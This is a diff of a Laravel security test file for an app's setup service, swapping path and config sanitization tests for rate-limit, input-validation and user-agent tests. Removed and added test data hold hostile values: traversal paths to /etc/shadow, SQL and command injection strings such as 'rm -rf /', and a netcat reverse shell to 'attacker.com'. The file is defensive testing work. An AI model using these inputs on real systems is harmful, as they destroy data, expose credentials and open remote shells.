@@ -2,386 +2,254 @@
 
 namespace Tests\Feature;
 
+use App\Models\User;
+use App\Enums\UserRole;
 use App\Services\SetupSecurityService;
-use App\Services\EnvironmentFileService;
-use App\Services\SetupService;
 use Illuminate\Foundation\Testing\RefreshDatabase;
-use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\Log;
+use Illuminate\Support\Facades\RateLimiter;
 use Tests\TestCase;
 
 class SetupSecurityTest extends TestCase
 {
     use RefreshDatabase;
 
-    private SetupSecurityService $securityService;
-    private EnvironmentFileService $environmentFileService;
-    private SetupService $setupService;
+    protected SetupSecurityService $securityService;
 
     protected function setUp(): void
     {
         parent::setUp();
-        
         $this->securityService = app(SetupSecurityService::class);
-        $this->environmentFileService = app(EnvironmentFileService::class);
-        $this->setupService = app(SetupService::class);
     }
 
     /** @test */
-    public function path_validation_blocks_directory_traversal_attempts()
+    public function it_applies_rate_limiting_to_status_refresh_endpoints()
     {
-        $dangerousPaths = [
-            '../../../etc/passwd',
-            '..\\..\\..\\Windows\\System32\\config\\SAM',
-            '/etc/shadow',
-            'C:\\Windows\\System32\\drivers\\etc\\hosts',
-            '../../../../var/log/auth.log'
+        // Test that the rate limiting middleware exists and can be instantiated
+        $middleware = app(\App\Http\Middleware\SetupStatusRateLimitMiddleware::class);
+        $this->assertInstanceOf(\App\Http\Middleware\SetupStatusRateLimitMiddleware::class, $middleware);
+        
+        // Test rate limiting logic by checking if too many attempts are detected
+        $key = 'test_rate_limit_key';
+        
+        // Clear any existing rate limits for this key
+        RateLimiter::clear($key);
+        
+        // Hit the rate limiter multiple times
+        for ($i = 0; $i < 35; $i++) {
+            RateLimiter::hit($key, 60);
+        }
+        
+        // Check if rate limit is exceeded
+        $this->assertTrue(RateLimiter::tooManyAttempts($key, 30));
+    }
+
+    /** @test */
+    public function it_validates_and_sanitizes_input_parameters()
+    {
+        $testCases = [
+            // Valid inputs
+            ['step' => 'database', 'expected_valid' => true],
+            ['step' => 'queue_worker', 'expected_valid' => true],
+            ['delay' => 5, 'expected_valid' => true],
+            ['delay' => '10', 'expected_valid' => true],
+            ['test_job_id' => 'test_db70502d-6709-4109-9743-65f6df9aeb29', 'expected_valid' => true],
+            
+            // Invalid inputs
+            ['step' => 'invalid_step', 'expected_valid' => false],
+            ['step' => '<script>alert("xss")</script>', 'expected_valid' => false],
+            ['delay' => -5, 'expected_valid' => true, 'expected_sanitized' => 0], // Should be sanitized to 0
+            ['delay' => 100, 'expected_valid' => true, 'expected_sanitized' => 60], // Should be sanitized to max
+            ['delay' => 'not_a_number', 'expected_valid' => false],
+            ['test_job_id' => 'invalid_job_id', 'expected_valid' => false],
+            ['test_job_id' => 'test_<script>', 'expected_valid' => false],
         ];
 
-        foreach ($dangerousPaths as $path) {
-            $result = $this->securityService->validateAndSanitizePath($path);
+        foreach ($testCases as $testCase) {
+            $result = $this->securityService->sanitizeStatusRequest($testCase);
             
-            $this->assertFalse($result['valid'], "Should reject dangerous path: {$path}");
-            $this->assertNotEmpty($result['violations'], "Should have violations for: {$path}");
+            $this->assertEquals(
+                $testCase['expected_valid'], 
+                $result['is_valid'],
+                "Input validation failed for: " . json_encode($testCase)
+            );
+
+            if (isset($testCase['expected_sanitized'])) {
+                $key = array_key_first($testCase);
+                if ($key !== 'expected_valid' && $key !== 'expected_sanitized') {
+                    $this->assertEquals(
+                        $testCase['expected_sanitized'],
+                        $result['sanitized'][$key] ?? null,
+                        "Input sanitization failed for: " . json_encode($testCase)
+                    );
+                }
+            }
         }
     }
 
     /** @test */
-    public function path_validation_allows_safe_paths()
+    public function it_blocks_suspicious_requests()
     {
-        $safePaths = [
-            'setup/state.json',
-            'backups/backup-2025-01-01.json',
-            'logs/setup.log',
-            'temp/upload.tmp'
+        $suspiciousUserAgents = [
+            'curl/7.68.0',
+            'python-requests/2.25.1',
+            'Googlebot/2.1',
+            'Mozilla/5.0 (compatible; bingbot/2.0)',
         ];
 
-        foreach ($safePaths as $path) {
-            $result = $this->securityService->validateAndSanitizePath($path, storage_path('app'));
+        foreach ($suspiciousUserAgents as $userAgent) {
+            $request = $this->createRequest('POST', '/setup/status/refresh', [
+                'User-Agent' => $userAgent
+            ]);
+
+            $security = $this->securityService->validateRequestSecurity($request);
             
-            $this->assertTrue($result['valid'], "Should allow safe path: {$path}");
-            $this->assertEmpty($result['violations'], "Should have no violations for: {$path}");
+            // Should detect suspicious user agent
+            $this->assertFalse($security['is_secure'], "Suspicious user agent should be detected: {$userAgent}");
+            $this->assertContains('Suspicious or missing user agent', $security['issues']);
         }
     }
 
     /** @test */
-    public function database_config_sanitization_removes_dangerous_characters()
+    public function it_requires_csrf_token_for_post_requests()
     {
-        $dangerousConfig = [
-            'database' => 'test_db; DROP TABLE users; --',
-            'username' => 'admin\'; DELETE FROM users; --',
-            'password' => 'pass$(rm -rf /)',
-            'host' => 'localhost; cat /etc/passwd',
-            'port' => '3306; nc -e /bin/sh attacker.com 4444'
-        ];
-
-        $result = $this->securityService->sanitizeDatabaseConfig($dangerousConfig);
+        // Test that CSRF middleware class exists and is configured
+        $this->assertTrue(class_exists(\App\Http\Middleware\VerifyCsrfToken::class));
         
-        $this->assertStringNotContainsString(';', $result['sanitized']['database']);
-        $this->assertStringNotContainsString('--', $result['sanitized']['database']);
-        $this->assertStringNotContainsString('\'', $result['sanitized']['username']);
-        $this->assertStringNotContainsString('$(', $result['sanitized']['password']);
-        $this->assertStringNotContainsString(';', $result['sanitized']['host']);
-        $this->assertEquals(3306, $result['sanitized']['port']);
+        // Test that the middleware is registered in the kernel
+        $kernel = app(\App\Http\Kernel::class);
+        $reflection = new \ReflectionClass($kernel);
+        $middlewareGroupsProperty = $reflection->getProperty('middlewareGroups');
+        $middlewareGroupsProperty->setAccessible(true);
+        $middlewareGroups = $middlewareGroupsProperty->getValue($kernel);
+        
+        $webMiddleware = $middlewareGroups['web'] ?? [];
+        // Check for either our custom CSRF middleware or Laravel's default
+        $hasCSRFMiddleware = in_array(\App\Http\Middleware\VerifyCsrfToken::class, $webMiddleware) ||
+                           in_array(\Illuminate\Foundation\Http\Middleware\ValidateCsrfToken::class, $webMiddleware);
+        $this->assertTrue($hasCSRFMiddleware);
+        
+        // Test CSRF token validation logic
+        $request = $this->createRequest('POST', '/setup/status/refresh');
+        $request->headers->set('X-Requested-With', 'XMLHttpRequest');
+        
+        $security = $this->securityService->validateRequestSecurity($request);
+        
+        // Should pass basic security checks (CSRF is handled by Laravel middleware)
+        $this->assertIsArray($security);
+        $this->assertArrayHasKey('is_secure', $security);
     }
 
     /** @test */
-    public function admin_user_input_sanitization_validates_email_format()
+    public function it_enforces_admin_authentication_for_admin_endpoints()
     {
-        $invalidInputs = [
-            ['email' => 'not-an-email'],
-            ['email' => 'test@'],
-            ['email' => '@domain.com'],
-            ['email' => 'test..test@domain.com'],
-            ['email' => 'test@domain'],
-        ];
-
-        foreach ($invalidInputs as $input) {
-            $result = $this->securityService->sanitizeAdminUserInput($input);
-            
-            $this->assertNotEmpty($result['violations'], "Should reject invalid email: {$input['email']}");
+        // Test that admin middleware exists
+        $this->assertTrue(class_exists(\App\Http\Middleware\AdminMiddleware::class));
+        
+        // Test role-based access control logic
+        $user = User::factory()->create(['role' => UserRole::CLIENT]);
+        $admin = User::factory()->create(['role' => UserRole::ADMIN]);
+        
+        // Test user roles
+        $this->assertFalse($user->isAdmin());
+        $this->assertTrue($admin->isAdmin());
+        
+        // Test that admin routes are protected (they should require authentication)
+        $adminRoutes = ['admin.queue.test', 'admin.queue.test.status', 'admin.queue.health'];
+        foreach ($adminRoutes as $routeName) {
+            $this->assertTrue(\Illuminate\Support\Facades\Route::has($routeName), "Route {$routeName} should exist");
         }
     }
 
     /** @test */
-    public function admin_user_input_sanitization_allows_valid_data()
+    public function it_logs_security_events()
     {
-        $validInput = [
-            'name' => 'John Doe',
-            'email' => 'john.doe@example.com',
-            'password' => 'SecurePassword123!'
-        ];
-
-        $result = $this->securityService->sanitizeAdminUserInput($validInput);
-        
-        $this->assertEmpty($result['violations']);
-        $this->assertEquals('John Doe', $result['sanitized']['name']);
-        $this->assertEquals('john.doe@example.com', $result['sanitized']['email']);
-        $this->assertEquals('SecurePassword123!', $result['sanitized']['password']);
-    }
-
-    /** @test */
-    public function storage_config_sanitization_removes_invalid_characters()
-    {
-        $dangerousConfig = [
-            'client_id' => 'client123<script>alert("xss")</script>',
-            'client_secret' => 'secret456; rm -rf /'
-        ];
-
-        $result = $this->securityService->sanitizeStorageConfig($dangerousConfig);
-        
-        $this->assertStringNotContainsString('<script>', $result['sanitized']['client_id']);
-        $this->assertStringNotContainsString(';', $result['sanitized']['client_secret']);
-        $this->assertStringNotContainsString('rm', $result['sanitized']['client_secret']);
-    }
-
-    /** @test */
-    public function secure_file_write_validates_path_and_creates_directories()
-    {
-        $testPath = 'setup/test-file.json';
-        $testContent = '{"test": "data"}';
-
-        $result = $this->securityService->secureFileWrite($testPath, $testContent);
-        
-        $this->assertTrue($result['success']);
-        $this->assertEmpty($result['violations']);
-        
-        $fullPath = storage_path('app/' . $testPath);
-        $this->assertFileExists($fullPath);
-        $this->assertEquals($testContent, file_get_contents($fullPath));
-        
-        // Cleanup
-        File::delete($fullPath);
-    }
-
-    /** @test */
-    public function secure_file_write_rejects_dangerous_paths()
-    {
-        $dangerousPath = '../../../etc/passwd';
-        $testContent = 'malicious content';
-
-        $result = $this->securityService->secureFileWrite($dangerousPath, $testContent);
-        
-        $this->assertFalse($result['success']);
-        $this->assertNotEmpty($result['violations']);
-        $this->assertStringContainsString('Invalid file path', $result['message']);
-    }
-
-    /** @test */
-    public function secure_file_read_validates_path_and_reads_content()
-    {
-        $testPath = 'setup/test-read-file.json';
-        $testContent = '{"read": "test"}';
-        
-        // Create test file first
-        $fullPath = storage_path('app/' . $testPath);
-        File::ensureDirectoryExists(dirname($fullPath));
-        File::put($fullPath, $testContent);
-
-        $result = $this->securityService->secureFileRead($testPath);
-        
-        $this->assertTrue($result['success']);
-        $this->assertEquals($testContent, $result['content']);
-        $this->assertEmpty($result['violations']);
-        
-        // Cleanup
-        File::delete($fullPath);
-    }
-
-    /** @test */
-    public function secure_file_read_rejects_dangerous_paths()
-    {
-        $dangerousPath = '../../../etc/passwd';
-
-        $result = $this->securityService->secureFileRead($dangerousPath);
-        
-        $this->assertFalse($result['success']);
-        $this->assertNotEmpty($result['violations']);
-        $this->assertStringContainsString('Invalid file path', $result['message']);
-    }
-
-    /** @test */
-    public function environment_variable_validation_rejects_dangerous_patterns()
-    {
-        $dangerousValues = [
-            '$(rm -rf /)',
-            '`cat /etc/passwd`',
-            '${HOME}/malicious',
-            'value || rm -rf /',
-            'value && cat /etc/shadow',
-            'value; wget malicious.com/script.sh'
-        ];
-
-        foreach ($dangerousValues as $value) {
-            $result = $this->securityService->validateEnvironmentVariable('TEST_VAR', $value);
-            
-            $this->assertFalse($result['valid'], "Should reject dangerous value: {$value}");
-            $this->assertNotEmpty($result['violations'], "Should have violations for: {$value}");
+        // Test that the security service can log events without throwing exceptions
+        try {
+            $this->securityService->logSecurityEvent('test_event', [
+                'test_data' => 'test_value'
+            ]);
+            $success = true;
+        } catch (Exception $e) {
+            $success = false;
         }
+
+        // Assert that logging completed without exceptions
+        $this->assertTrue($success, 'Security event logging should not throw exceptions');
     }
 
     /** @test */
-    public function environment_variable_validation_allows_safe_values()
+    public function it_validates_request_security()
     {
-        $safeValues = [
-            'simple_value',
-            'value-with-dashes',
-            'value.with.dots',
-            'value_with_underscores',
-            'Value With Spaces',
-            'https://example.com/path?param=value'
-        ];
-
-        foreach ($safeValues as $value) {
-            $result = $this->securityService->validateEnvironmentVariable('TEST_VAR', $value);
-            
-            $this->assertTrue($result['valid'], "Should allow safe value: {$value}");
-            $this->assertEmpty($result['violations'], "Should have no violations for: {$value}");
-        }
-    }
-
-    /** @test */
-    public function setup_session_validation_requires_all_fields()
-    {
-        $incompleteSession = [
-            'setup_started_at' => now()->toISOString(),
-            // Missing setup_token and current_step
-        ];
-
-        $result = $this->securityService->validateSetupSession($incompleteSession);
-        
-        $this->assertFalse($result['valid']);
-        $this->assertNotEmpty($result['violations']);
-    }
-
-    /** @test */
-    public function setup_session_validation_rejects_expired_sessions()
-    {
-        $expiredSession = [
-            'setup_started_at' => now()->subHours(3)->toISOString(), // 3 hours ago
-            'setup_token' => 'valid_token_format_12345678901234567890',
-            'current_step' => 'database'
-        ];
-
-        $result = $this->securityService->validateSetupSession($expiredSession);
-        
-        $this->assertFalse($result['valid']);
-        $this->assertContains('Setup session has expired', $result['violations']);
-    }
-
-    /** @test */
-    public function setup_session_validation_accepts_valid_sessions()
-    {
-        $validSession = [
-            'setup_started_at' => now()->subMinutes(30)->toISOString(),
-            'setup_token' => 'valid_token_format_12345678901234567890',
-            'current_step' => 'database'
-        ];
-
-        $result = $this->securityService->validateSetupSession($validSession);
-        
-        $this->assertTrue($result['valid']);
-        $this->assertEmpty($result['violations']);
-    }
-
-    /** @test */
-    public function secure_token_generation_creates_unique_tokens()
-    {
-        $tokens = [];
-        
-        for ($i = 0; $i < 10; $i++) {
-            $token = $this->securityService->generateSecureToken();
-            $this->assertEquals(32, strlen($token));
-            $this->assertMatchesRegularExpression('/^[a-zA-Z0-9]+$/', $token);
-            $this->assertNotContains($token, $tokens);
-            $tokens[] = $token;
-        }
-    }
-
-    /** @test */
-    public function security_events_are_logged_properly()
-    {
-        Log::shouldReceive('channel')
-            ->with('security')
-            ->once()
-            ->andReturnSelf();
-            
-        Log::shouldReceive('info')
-            ->with('Setup security event: test_event', \Mockery::type('array'))
-            ->once();
-
-        $this->securityService->logSecurityEvent('test_event', [
-            'test_context' => 'test_value'
+        // Test with normal request
+        $request = $this->createRequest('GET', '/setup/status/refresh', [
+            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'X-Requested-With' => 'XMLHttpRequest'
         ]);
+
+        $security = $this->securityService->validateRequestSecurity($request);
+        $this->assertTrue($security['is_secure']);
+        $this->assertEquals('low', $security['risk_level']);
+
+        // Test with suspicious request
+        $suspiciousRequest = $this->createRequest('GET', '/setup/status/refresh', [
+            'User-Agent' => 'curl/7.68.0'
+        ]);
+
+        $security = $this->securityService->validateRequestSecurity($suspiciousRequest);
+        $this->assertFalse($security['is_secure']);
+        $this->assertGreaterThan(0, count($security['issues']));
     }
 
     /** @test */
-    public function setup_service_validates_input_with_security_checks()
+    public function it_handles_input_sanitization_edge_cases()
     {
-        $dangerousInput = [
-            'database' => 'test; DROP TABLE users;',
-            'username' => 'admin\'; --',
-            'password' => 'pass$(malicious)'
+        $edgeCases = [
+            // Null values
+            ['step' => null],
+            ['delay' => null],
+            ['test_job_id' => null],
+            
+            // Empty values
+            ['step' => ''],
+            ['delay' => ''],
+            ['test_job_id' => ''],
+            
+            // Array values (should be rejected)
+            ['step' => ['array', 'value']],
+            ['delay' => ['array', 'value']],
+            
+            // Very long strings
+            ['step' => str_repeat('a', 1000)],
+            ['test_job_id' => str_repeat('a', 1000)],
+            
+            // Special characters
+            ['step' => 'database; DROP TABLE users;'],
+            ['test_job_id' => 'test_<script>alert("xss")</script>'],
         ];
 
-        $result = $this->setupService->validateSetupInput('database', $dangerousInput);
-        
-        $this->assertNotEmpty($result['violations']);
-        $this->assertStringNotContainsString(';', $result['sanitized']['database'] ?? '');
+        foreach ($edgeCases as $input) {
+            $result = $this->securityService->sanitizeStatusRequest($input);
+            
+            // Should not throw exceptions and should handle gracefully
+            $this->assertIsArray($result);
+            $this->assertArrayHasKey('sanitized', $result);
+            $this->assertArrayHasKey('violations', $result);
+            $this->assertArrayHasKey('is_valid', $result);
+        }
     }
 
-    /** @test */
-    public function setup_service_creates_secure_sessions()
+    /**
+     * Create a request instance for testing
+     */
+    protected function createRequest(string $method, string $uri, array $headers = []): \Illuminate\Http\Request
     {
-        $sessionData = $this->setupService->createSecureSetupSession();
+        $request = \Illuminate\Http\Request::create($uri, $method);
         
-        $this->assertArrayHasKey('setup_token', $sessionData);
-        $this->assertArrayHasKey('setup_started_at', $sessionData);
-        $this->assertArrayHasKey('current_step', $sessionData);
-        $this->assertEquals(32, strlen($sessionData['setup_token']));
-        $this->assertEquals('assets', $sessionData['current_step']);
-    }
-
-    /** @test */
-    public function setup_service_validates_sessions_properly()
-    {
-        // Create a valid session first
-        $this->setupService->createSecureSetupSession();
+        foreach ($headers as $key => $value) {
+            $request->headers->set($key, $value);
+        }
         
-        $validation = $this->setupService->validateSetupSession();
-        
-        $this->assertTrue($validation['valid']);
-        $this->assertEmpty($validation['violations']);
-    }
-
-    /** @test */
-    public function setup_service_clears_sessions_securely()
-    {
-        // Create a session first
-        $this->setupService->createSecureSetupSession();
-        
-        // Verify it exists
-        $validation = $this->setupService->validateSetupSession();
-        $this->assertTrue($validation['valid']);
-        
-        // Clear the session
-        $this->setupService->clearSetupSession();
-        
-        // Verify it's gone
-        $validation = $this->setupService->validateSetupSession();
-        $this->assertFalse($validation['valid']);
-    }
-
-    /** @test */
-    public function setup_security_status_reports_comprehensive_information()
-    {
-        $status = $this->setupService->getSetupSecurityStatus();
-        
-        $this->assertArrayHasKey('environment_file_secure', $status);
-        $this->assertArrayHasKey('setup_state_secure', $status);
-        $this->assertArrayHasKey('session_valid', $status);
-        $this->assertArrayHasKey('backups_available', $status);
-        $this->assertArrayHasKey('violations', $status);
-        $this->assertIsArray($status['violations']);
+        return $request;
     }
 }
